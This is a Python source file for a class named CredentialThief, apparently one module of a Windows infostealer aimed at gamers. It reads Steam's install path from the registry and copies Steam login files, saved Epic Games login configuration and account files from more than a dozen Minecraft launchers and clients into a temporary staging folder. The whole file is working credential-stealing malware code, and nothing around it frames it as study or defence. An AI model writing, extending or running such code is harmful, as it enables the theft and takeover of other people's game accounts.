import os
import shutil
import threading
import winreg

class CredentialThief:
    def __init__(self, browsers_instance):
        self.browsers = browsers_instance
        self.temp_path = self.browsers.temp_path
        self.user_profile = os.getenv("USERPROFILE")
        self.roaming = os.getenv("APPDATA")
        self.localappdata = os.getenv("LOCALAPPDATA")
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
            self.steam_path, _ = winreg.QueryValueEx(reg_key, "SteamPath")
        except Exception:
            self.steam_path = r"C:\Program Files (x86)\Steam"
        self.mc_paths = {
            "Intent": os.path.join(self.user_profile, "intentlauncher", "launcherconfig"),
            "Lunar": os.path.join(self.user_profile, ".lunarclient", "settings", "game", "accounts.json"),
            "TLauncher": os.path.join(self.roaming, ".minecraft", "TlauncherProfiles.json"),
            "Feather": os.path.join(self.roaming, ".feather", "accounts.json"),
            "Meteor": os.path.join(self.roaming, ".minecraft", "meteor-client", "accounts.nbt"),
            "Impact": os.path.join(self.roaming, ".minecraft", "Impact", "alts.json"),
            "Novoline": os.path.join(self.roaming, ".minecraft", "Novoline", "alts.novo"),
            "CheatBreakers": os.path.join(self.roaming, ".minecraft", "cheatbreaker_accounts.json"),
            "Microsoft Store": os.path.join(self.roaming, ".minecraft", "launcher_accounts_microsoft_store.json"),
            "Rise": os.path.join(self.roaming, ".minecraft", "Rise", "alts.txt"),
            "Rise (Intent)": os.path.join(self.user_profile, "intentlauncher", "Rise", "alts.txt"),
            "Paladium": os.path.join(self.roaming, "paladium-group", "accounts.json"),
            "PolyMC": os.path.join(self.roaming, "PolyMC", "accounts.json"),
            "Badlion": os.path.join(self.roaming, "Badlion Client", "accounts.json"),
            # ADD MORE 
        }

    def steal_steam_creds(self):
        vdf_path = os.path.join(self.steam_path, "config", "loginusers.vdf")
        if os.path.isfile(vdf_path):
            shutil.copy(vdf_path, self.temp_path)
            print(f"Copied Steam config to {self.temp_path}")

    def steal_epic_creds(self):
        save_to_path = os.path.join(self.temp_path, "Games", "Epic")
        epic_path = os.path.join(self.localappdata, "EpicGamesLauncher", "Saved", "Config", "Windows")
        os.makedirs(save_to_path, exist_ok=True)
        if not os.path.isdir(epic_path):
            print(f"Epic directory not found: {epic_path}")
            return
        login_file = os.path.join(epic_path, "GameUserSettings.ini")
        if os.path.isfile(login_file):
            try:
                with open(login_file, "r", encoding="utf-8") as file:
                    contents = file.read()
                if "[RememberMe]" in contents:
                    for file in os.listdir(epic_path):
                        if os.path.isfile(os.path.join(epic_path, file)):
                            shutil.copy(os.path.join(epic_path, file), os.path.join(save_to_path, file))
                    print("Epic creds dumped")
            except Exception as e:
                print(f"Epic error: {e}")

    async def steal_minecraft_creds(self):
        save_to_path = os.path.join(self.temp_path, "Games", "Minecraft")
        for name, path in self.mc_paths.items():
            if os.path.isfile(path):
                os.makedirs(os.path.join(save_to_path, name), exist_ok=True)
                shutil.copy(path, os.path.join(save_to_path, name, os.path.basename(path)))
                print(f"Copied {name} to {save_to_path}")

    async def extract_data(self):
        threads = []
        funcs = [self.steal_steam_creds, self.steal_epic_creds]
        for func in funcs:
            thread = threading.Thread(target=func)
            thread.start()
            threads.append(thread)
        await self.steal_minecraft_creds()
        for thread in threads:
            thread.join()